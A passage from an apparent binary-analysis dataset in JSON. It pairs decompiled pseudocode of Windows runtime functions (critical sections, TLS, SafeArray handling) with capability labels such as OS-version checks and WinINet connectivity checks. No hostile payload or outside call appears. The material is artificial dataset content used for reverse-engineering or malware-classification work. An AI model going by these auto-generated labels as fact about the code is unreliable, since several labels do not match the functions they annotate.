        "decompiled_code": "\nvoid __fastcall fcn.00430cd6(int32_t param_1)\n\n{\n    if (*(param_1 + 8) != 0) {\n        (**(**(param_1 + 8) + 4))(*(param_1 + 8));\n        return;\n    }\n    (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(param_1 + 4);\n    return;\n}\n",
        "token_count": 86
    },
    "00430cf1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00430cf1(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    int32_t iVar3;\n    \n    iVar3 = 8;\n    fcn.00458e45(8);\n    if ((extraout_ECX[1] != 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(extraout_ECX + 1),  iVar2 == 0)\n       ) {\n        fcn.0042b84e(extraout_ECX[7]);\n        iVar1 = *extraout_ECX;\n        *(unaff_EBP + -4) = 0;\n        (**(iVar1 + 0x10))();\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (*(unaff_EBP + -0x10) != 0) {\n            fcn.0042abcb();\n            iVar3 = iVar2;\n        }\n    }\n    fcn.00458f1d(iVar3);\n    return;\n}\n",
        "token_count": 280
    },
    "00430f74": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00430f74(int32_t param_1)\n\n{\n    if (param_1 != 0) {\n    // WARNING: Could not recover jumptable at 0x00430f7b. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.KERNEL32.dll_LocalFree)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "004310bb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.004310bb(int32_t param_1, int32_t param_2)\n\n{\n    int32_t extraout_ECX;\n    \n    if (param_2 == 0) {\n        fcn.0041901a();\n        param_1 = extraout_ECX;\n    }\n    return *(param_1 + 4) + param_2;\n}\n",
        "token_count": 86
    },
    "0043147a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043147a(uint *arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    bool bVar2;\n    uint *in_ECX;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar3 = 1;\n    bVar2 = true;\n    if (1 < arg_8h[2]) {\n        do {\n            if ((arg_ch == 0) || (*(in_ECX[4] + 4 + iVar3 * 8) == arg_ch)) {\n                puVar1 = *(arg_8h[3] + iVar3 * 4);\n                if (puVar1 != NULL) {\n                    (***puVar1)(1);\n                }\n                *(arg_8h[3] + iVar3 * 4) = 0;\n            }\n            else if (*(arg_8h[3] + iVar3 * 4) != 0) {\n                bVar2 = false;\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < arg_8h[2]);\n        if (!bVar2) {\n            return;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(in_ECX + 7);\n    fcn.004310f1(arg_8h);\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(in_ECX + 7);\n    (*_sym.imp.KERNEL32.dll_LocalFree)(arg_8h[3]);\n    (***arg_8h)(1);\n    (*_sym.imp.KERNEL32.dll_TlsSetValue)(*in_ECX, 0);\n    return;\n}\n",
        "token_count": 361
    },
    "0043150f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0043150f(uint *param_1, int32_t param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint unaff_retaddr;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(param_1 + 7);\n    if (param_2 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(*param_1);\n        if (iVar2 != 0) {\n            fcn.0043147a(iVar2, unaff_retaddr);\n        }\n    }\n    else {\n        iVar2 = param_1[5];\n        while (iVar2 != 0) {\n            iVar1 = *(iVar2 + 4);\n            fcn.0043147a(iVar2, param_3);\n            iVar2 = iVar1;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(param_1 + 7);\n    return;\n}\n",
        "token_count": 219
    },
    "00431568": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00431568(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_ch;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45(4);\n    if (*(unaff_EBP + 8) != 0) goto code_r0x00431587;\ncode_r0x00431582:\n    do {\n        fcn.0041901a();\ncode_r0x00431587:\n        if (*extraout_ECX != 0) goto code_r0x004315c2;\n        if (*0x4ad250 == 0) {\n            *(unaff_EBP + -0x10) = 0x4ad254;\n            *(unaff_EBP + -4) = 0;\n            *0x4ad250 = fcn.0043128d();\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x4ad250 == 0) goto code_r0x00431582;\n        }\n        iVar1 = fcn.00431157();\n        *extraout_ECX = iVar1;\n        if (iVar1 != 0) {\ncode_r0x004315c2:\n            iVar1 = fcn.00430f84(*extraout_ECX);\n            if (iVar1 == 0) {\n                arg_ch = (**(unaff_EBP + 8))();\n                fcn.0043132f(*extraout_ECX, arg_ch);\n            }\n            fcn.00458f1d();\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 387
    },
    "004316c7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004316c7(int32_t param_1, uint32_t param_2, int32_t param_3)\n\n{\n    uint uVar1;\n    \n    if (param_2 == 0) {\n        param_2 = 0x11;\n    }\n    if (*(param_1 + 4) != 0) {\n        fcn.004170df(*(param_1 + 4));\n        *(param_1 + 4) = 0;\n    }\n    if (param_3 != 0) {\n        uVar1 = fcn.004170b4(-(param_2 * 4 >> 0x20 != 0) | param_2 * 4);\n        *(param_1 + 4) = uVar1;\n        fcn.00459330(uVar1, 0, param_2 << 2);\n    }\n    *(param_1 + 8) = param_2;\n    return;\n}\n",
        "token_count": 211
    },
    "00431901": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00431901(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    if (*(param_1 + 0x10) == 0) {\n        iVar3 = fcn.00436335(param_1 + 0x14, *(param_1 + 0x18), 0xc);\n        iVar1 = *(param_1 + 0x18);\n        puVar4 = iVar3 + -8 + iVar1 * 0xc;\n        while (iVar1 = iVar1 + -1,  -1 < iVar1) {\n            *puVar4 = *(param_1 + 0x10);\n            *(param_1 + 0x10) = puVar4;\n            puVar4 = puVar4 + -3;\n        }\n    }\n    puVar4 = *(param_1 + 0x10);\n    uVar2 = *puVar4;\n    *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n    *(param_1 + 0x10) = uVar2;\n    puVar4[1] = 0;\n    puVar4[2] = 0;\n    return;\n}\n",
        "token_count": 287
    },
    "00431b2a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00431b2a(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (param_1 != 0) {\n        var_8h = -(*(param_1 + 0x44) != 0);\n        while (var_8h != 0) {\n            fcn.00431847(&var_8h, &var_ch, &var_4h);\n            puVar1 = *(param_1 + 0x58) + var_4h;\n            *puVar1 = 0;\n            if (*(param_1 + 0x5c) == 2) {\n                puVar1[1] = 0;\n            }\n            (**(param_1 + 0x18))(var_4h);\n        }\n        fcn.00431721();\n        fcn.004445d8();\n    }\n    return;\n}\n",
        "token_count": 221
    },
    "00431c37": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00431c37(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    \n    iVar1 = fcn.0042b82c();\n    if ((*(iVar1 + 0x10) != 0) && (iVar2 = *(iVar1 + 0x10) + -1,  *(iVar1 + 0x10) = iVar2,  iVar2 == 0)) {\n        if (arg_8h != 0) {\n            if (((arg_8h != -1) && (iVar2 = fcn.0042536e(),  iVar2 != 0)) && (*(iVar2 + 0x3c) != NULL)) {\n                (**(iVar2 + 0x3c))(0, 0);\n            }\n            fcn.00431b2a();\n            fcn.00431b2a();\n            fcn.00431b2a();\n            fcn.00431b2a();\n            fcn.00431b2a();\n        }\n        iVar2 = fcn.0042b7b9();\n        iVar2 = *(iVar2 + 4);\n        iVar3 = fcn.00431011();\n        if ((((iVar3 != 0) && (iVar2 != 0)) &&\n            ((*(iVar3 + 0xc) == 0 || (uVar4 = fcn.0045d168(*(iVar3 + 0xc)),  uVar4 < *(iVar2 + 0x98))))) &&\n           (*(iVar2 + 0x98) != 0)) {\n            arg_8h = 0;\n            if (*(iVar3 + 0xc) != 0) {\n                arg_8h = fcn.0045d168(*(iVar3 + 0xc));\n                fcn.0045839d(*(iVar3 + 0xc));\n            }\n            iVar2 = fcn.004582da(*(iVar2 + 0x98));\n            *(iVar3 + 0xc) = iVar2;\n            if ((iVar2 == 0) && (arg_8h != 0)) {\n                uVar5 = fcn.004582da(arg_8h);\n                *(iVar3 + 0xc) = uVar5;\n            }\n        }\n    }\n    return *(iVar1 + 0x10) != 0;\n}\n",
        "token_count": 540
    },
    "00432092": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.00432092(void)\n\n{\n    if (*0x4ad28c == 0) {\n        *0x4ad28c = 1;\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x4ad428);\n    }\n    return *0x4ad28c;\n}\n",
        "token_count": 71
    },
    "004320fb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.004320fb(uint32_t param_1)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    \n    if (0x10 < param_1) {\n        fcn.0041901a();\n    }\n    if (*0x4ad28c == 0) {\n        fcn.00432092();\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_EnterCriticalSection;\n    piVar1 = param_1 * 4 + 0x4ad440;\n    if (*piVar1 == 0) {\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x4ad428);\n        if (*piVar1 == 0) {\n            (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(param_1 * 0x18 + 0x4ad290);\n            *piVar1 = *piVar1 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4ad428);\n    }\n    (*pcVar2)(param_1 * 0x18 + 0x4ad290);\n    return;\n}\n",
        "token_count": 246
    },
    "0043247e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043247e(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint unaff_ESI;\n    uint uStack8;\n    \n    if (*(param_1 + 0x10) == 0) {\n        uStack8 = 0xc;\n        iVar2 = fcn.00436335(param_1 + 0x14, *(param_1 + 0x18));\n        iVar1 = *(param_1 + 0x18);\n        puVar3 = iVar2 + -8 + iVar1 * 0xc;\n        while (iVar1 = iVar1 + -1,  -1 < iVar1) {\n            *puVar3 = *(param_1 + 0x10);\n            *(param_1 + 0x10) = puVar3;\n            puVar3 = puVar3 + -3;\n        }\n    }\n    puVar3 = *(param_1 + 0x10);\n    *(param_1 + 0x10) = *puVar3;\n    puVar3[1] = uStack8;\n    *puVar3 = unaff_ESI;\n    *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n    puVar3[2] = 0;\n    return;\n}\n",
        "token_count": 303
    },
    "0043252a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043252a(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = arg_8h;\n    if (arg_8h == 0) {\n        fcn.0041901a();\n    }\n    arg_8h = *(iVar1 + 8);\n    while (arg_8h != 0) {\n        fcn.0042296a(&arg_8h);\n        fcn.004324d7();\n    }\n    return;\n}\n",
        "token_count": 114
    },
    "00432567": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00432567(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = arg_8h;\n    if (arg_8h == 0) {\n        fcn.0041901a();\n    }\n    arg_8h = *(iVar1 + 4);\n    while (arg_8h != 0) {\n        fcn.0041c771(&arg_8h);\n        fcn.00432501();\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "00432b12": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00432b12(uint32_t arg_8h, uint *arg_ch)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    uint *var_8h;\n    int32_t var_4h;\n    \n    puVar2 = arg_ch;\n    *arg_ch = 1;\n    fcn.00432a06(&arg_ch + 3);\n    if (arg_ch._3_1_ == -1) {\n        fcn.00432a8d(&arg_8h);\n        if (arg_8h == -2) {\n            *puVar2 = 2;\n            fcn.00432a06(&arg_ch + 3);\n            if (arg_ch._3_1_ != -1) goto code_r0x00432b36;\n            fcn.00432a8d(&arg_8h);\n        }\n        if (arg_8h == -1) {\n            fcn.00432ad0(&arg_ch);\n            puVar2 = arg_ch;\n            if (arg_ch == 0xffffffff) {\n                fcn.00432a45(&var_8h);\n                if ((var_4h != 0) || (puVar2 = var_8h,  0x7fffffff < var_8h)) {\n                    fcn.00435da3(1, 0);\n                    pcVar1 = swi(3);\n                    puVar2 = (*pcVar1)();\n                    return puVar2;\n                }\n            }\n        }\n        else {\n            puVar2 = arg_8h & 0xffff;\n        }\n    }\n    else {\ncode_r0x00432b36:\n        puVar2 = arg_ch >> 0x18;\n    }\n    return puVar2;\n}\n",
        "token_count": 389
    },
    "00432c3c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "contain loop"
        ],
        "decompiled_code": "\nuint * fcn.00432c3c(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint unaff_retaddr;\n    \n    if (param_1 == 0) {\n        fcn.0041901a();\n    }\n    iVar1 = fcn.0042b7b9();\n    fcn.004320fb(0);\n    puVar2 = *(iVar1 + 0x1c);\n    while( true ) {\n        if (puVar2 == NULL) {\n            fcn.00432168(0);\n            return NULL;\n        }\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(unaff_retaddr, *puVar2);\n        if (iVar1 == 0) break;\n        puVar2 = puVar2[5];\n    }\n    fcn.00432168(0);\n    return puVar2;\n}\n",
        "token_count": 201
    },
    "00433456": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00433456(int16_t *plLbound, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    int16_t *piVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t cDims;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    piVar2 = plLbound;\n    if ((*plLbound != 0x2011) || (iVar3 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetElemsize)(*(plLbound + 4)),  iVar3 != 1))\n    {\n        (*_sym.imp.OLEAUT32.dll_VariantCopy)(piVar2);\n        var_8h = 0;\n        cDims = arg_ch;\n        *piVar2 = 0x2011;\n        iVar3 = (*_sym.imp.OLEAUT32.dll_SafeArrayDestroy)(0x11, 1, &cDims);\n        *(piVar2 + 4) = iVar3;\n        if (iVar3 != 0) {\n            return;\n        }\n        fcn.00418fe6();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    uVar4 = (*_sym.imp.OLEAUT32.dll_SafeArrayLock)(*(piVar2 + 4), 1, &var_4h);\n    fcn.004331ab(uVar4);\n    uVar4 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetLBound)(*(piVar2 + 4), 1, &plLbound);\n    fcn.004331ab(uVar4);\n    iVar3 = plLbound - var_4h;\n    if (iVar3 < 0) {\n        iVar3 = 0;\n    }\n    if (iVar3 == arg_ch) {\n        return;\n    }\n    cDims = arg_ch;\n    var_8h = var_4h;\n    uVar4 = (*_sym.imp.OLEAUT32.dll_SafeArrayAllocDescriptorEx)(*(piVar2 + 4), &cDims);\n    fcn.004331ab(uVar4);\n    return;\n}\n",
        "token_count": 482
    },
    "00433782": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00433782(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    if (arg_10h != 0) {\n        if ((arg_8h == 0) || (arg_ch == 0)) {\n            fcn.0041901a();\n        }\n        do {\n            arg_10h = arg_10h + -1;\n            fcn.0043374f();\n        } while (arg_10h != 0);\n    }\n    return;\n}\n",
        "token_count": 120
    },
    "00433ae1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00433ae1(int32_t param_1)\n\n{\n    if (param_1 != 0) {\n        fcn.00459330(param_1, 0, 0x18);\n    }\n    return;\n}\n",
        "token_count": 53
    },
    "00433e73": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00433e73(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uVar1 = (*_sym.imp.OLEAUT32.dll_SafeArrayUnaccessData)(*(in_ECX + 8), &var_ch);\n    fcn.004331ab(uVar1);\n    iVar2 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetElemsize)(*(in_ECX + 8));\n    if (iVar2 == 1) {\n        (*_sym.imp.OLEAUT32.dll_SafeArrayLock)(*(in_ECX + 8), 1, &var_8h);\n        (*_sym.imp.OLEAUT32.dll_SafeArrayGetLBound)(*(in_ECX + 8), 1, &var_4h);\n        iVar2 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetUBound)(*(in_ECX + 8));\n        iVar2 = iVar2 * ((var_4h - var_8h) + 1);\n        fcn.004447e3(iVar2, 0xffffffff);\n        fcn.00417b17(*(arg_8h + 4), iVar2, var_ch, iVar2);\n    }\n    else {\n        fcn.004447e3(0, 0xffffffff);\n    }\n    (*_sym.imp.OLEAUT32.dll_SafeArrayGetElement)(*(in_ECX + 8));\n    return;\n}\n",
        "token_count": 356
    },
    "004343ac": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004343ac(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uVar1 = (*_sym.imp.OLEAUT32.dll_SafeArrayUnaccessData)(*(in_ECX + 8), &var_ch);\n    fcn.004331ab(uVar1);\n    iVar2 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetElemsize)(*(in_ECX + 8));\n    if (iVar2 == 1) {\n        (*_sym.imp.OLEAUT32.dll_SafeArrayLock)(*(in_ECX + 8), 0, &var_8h);\n        (*_sym.imp.OLEAUT32.dll_SafeArrayGetLBound)(*(in_ECX + 8), 0, &var_4h);\n        iVar2 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetUBound)(*(in_ECX + 8));\n        iVar2 = iVar2 * ((var_4h - var_8h) + 1);\n        fcn.004447e3(iVar2, 0xffffffff);\n        fcn.00417b17(*(arg_8h + 4), iVar2, var_ch, iVar2);\n    }\n    else {\n        fcn.004447e3(0, 0xffffffff);\n    }\n    (*_sym.imp.OLEAUT32.dll_SafeArrayGetElement)(*(in_ECX + 8));\n    return;\n}\n",
        "token_count": 355
    },
    "00434446": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00434446(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uStack28;\n    uint *puStack24;\n    uint uStack20;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uStack20 = *(param_1 + 8);\n    puStack24 = 0x434457;\n    var_8h = param_1;\n    var_4h = param_1;\n    iVar2 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetElemsize)();\n    if (iVar2 != 1) {\n        uStack28 = 0x4a8690;\n        puStack24 = &stack0xfffffffc;\n        fcn.00456b8d(&stack0xffffffe4, 0x49ed44);\n        pcVar1 = swi(3);\n        iVar2 = (*pcVar1)();\n        return iVar2;\n    }\n    puStack24 = &fcn.00434446::var_4h;\n    uStack28 = 1;\n    fcn.00433a13();\n    fcn.004339f9(1, &fcn.00434446::var_8h);\n    return (var_4h - var_8h) + 1;\n}\n",
        "token_count": 295
    },
    "00434485": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00434485(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetElemsize)(*(in_ECX + 8));\n    if (iVar1 != 1) {\n        fcn.0041901a();\n    }\n    var_4h = 0;\n    var_8h = arg_8h;\n    fcn.00433a7b(&var_8h);\n    return;\n}\n",
        "token_count": 136
    },
    "004344ba": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004344ba(uint16_t *param_1, uint32_t param_2, int32_t param_3, int32_t param_4)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint16_t uVar4;\n    \n    if ((param_3 != 0) && (param_4 != 0)) {\n        uVar4 = param_2;\n        if (((param_2 & 0x7000) == 0) && ((uVar4 != 0 && (uVar4 != 1)))) {\n            (*_sym.imp.OLEAUT32.dll_VariantCopy)(param_1);\n            iVar2 = (*_sym.imp.OLEAUT32.dll_SafeArrayDestroy)(param_2, param_3, param_3);\n            *(param_1 + 4) = iVar2;\n            if (iVar2 == 0) {\n                iVar2 = fcn.00418fe6();\n            }\n            *param_1 = uVar4 | 0x2000;\n            *(param_1 + 10) = param_3;\n            uVar3 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetUBound)(iVar2);\n            *(param_1 + 8) = uVar3;\n            return;\n        }\n    }\n    fcn.0041901a();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 323
    },
    "00434c1d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00434c1d(uint arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    int64_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t in_ECX;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    uVar2 = arg_ch;\n    var_8h = in_ECX;\n    var_4h = in_ECX;\n    if (arg_ch != 0) goto code_r0x00434c32;\n    while( true ) {\n        fcn.0041901a();\ncode_r0x00434c32:\n        var_4h = arg_14h;\n        var_8h = uVar2;\n        fcn.004344ba(arg_8h, 1, &var_8h);\n        if (arg_10h == 0) break;\n        fcn.00433996(&arg_ch);\n        uVar3 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetUBound)(*(in_ECX + 8));\n        iVar1 = uVar3 * uVar2;\n        uVar3 = iVar1;\n        if ((iVar1 >> 0x20 == 0) && (uVar3 < 0x80000000)) {\n            fcn.00417b17(arg_ch, uVar3, arg_10h, uVar3);\n            fcn.004339ac();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 348
    },
    "004357f3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
